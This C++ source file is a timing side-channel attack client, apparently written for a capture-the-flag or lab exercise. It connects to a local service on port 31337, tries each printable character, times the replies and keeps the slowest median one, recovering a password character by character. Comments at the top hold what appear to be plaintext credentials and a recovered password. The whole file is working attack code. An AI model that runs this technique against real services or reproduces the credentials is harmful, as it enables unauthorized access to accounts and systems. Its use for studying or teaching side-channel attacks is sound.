#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <chrono>
#include <algorithm> // std::sort
#include <vector>

#define PASSWORD_SIZE 400
#define TRIES 100
#define MIN_CHAR 33
#define MAX_CHAR 127

// Credentials: 
//		User: thumbdrive
//		Pass: k8z2@W1L0XjEdS3Cvf3
// Password for 2.1: lockthemupforgood1!

bool sortfunction(double i, double j) { return (i < j); }

int main() {
	struct sockaddr_in address;
	int sock = 0, valread;
	struct sockaddr_in serv_addr;
	const char *hello = "Hello from client";
	char buffer[1024] = {0};
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		printf("\n Socket creation error \n");
		return -1;
	}

	memset(&serv_addr, '0', sizeof(serv_addr));

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(31337);

	// Convert IPv4 and IPv6 addresses from text to binary form
	if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0)
	{
		printf("\nInvalid address/ Address not supported \n");
		return -1;
	}

	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
	{
		printf("\nConnection Failed \n");
		return -1;
	}

	char password[PASSWORD_SIZE];
	memset(password, '\0', sizeof(char) * PASSWORD_SIZE);

	// We only included [A, z] initially, and the data seemed consistent until lockthemupforgood, after that data was incosistent (e was added with half the time other letters were added)
	// So to speed up our new run we bootstrapped "lockthemupforgood"
	//strcpy(password, "lockthemupforgood");
	double lastLoop = 0;
	
	for(int charIndex = strlen(password); charIndex < PASSWORD_SIZE - 1; charIndex++) {
		double maxTime = 0;
		char maxChar;
		std::vector<double>* means = new std::vector<double>[MAX_CHAR - MIN_CHAR];
		for(int tries = 0; tries < TRIES; tries++) {
			//fprintf(stdout, "It %d\n", tries);
			for(char iterationChar = MIN_CHAR; iterationChar < MAX_CHAR; iterationChar++) {
				password[charIndex] = iterationChar;
				send(sock, password, strlen(password), 0);
				std::chrono::high_resolution_clock::time_point t1 = std::chrono::high_resolution_clock::now();
				valread = read(sock, buffer, 1024);
				std::chrono::high_resolution_clock::time_point t2 = std::chrono::high_resolution_clock::now();

				std::chrono::duration<double, std::nano> nanoSeconds = t2 - t1;
				double durationLong = nanoSeconds.count() - (500000 * charIndex);
				means[iterationChar - MIN_CHAR].push_back(durationLong);

				if (strcmp(buffer, "Wrong!\n") != 0)
				{
					fprintf(stdout, "Answer found ----------\n");
					fprintf(stdout, "%s\n", password);
					fprintf(stdout, "%s\n", buffer);
					close(sock);
					return 0;
				}

				//fprintf(stdout, "Char %c\n", iterationChar);
			}
		}

		for(int i = 0; i < (MAX_CHAR - MIN_CHAR); i++) {
			std::sort(means[i].begin(), means[i].end(), sortfunction);
			double compareTime = means[i][TRIES / 2];
			if(compareTime > maxTime) {
				maxTime = compareTime;
				maxChar = MIN_CHAR + i;
			}
		}

		delete[] means;
		lastLoop = maxTime;
		password[charIndex] = maxChar;
		fprintf(stdout, "%s - %lf\n", password, maxTime);
	}
	close(sock);
	return 0;
}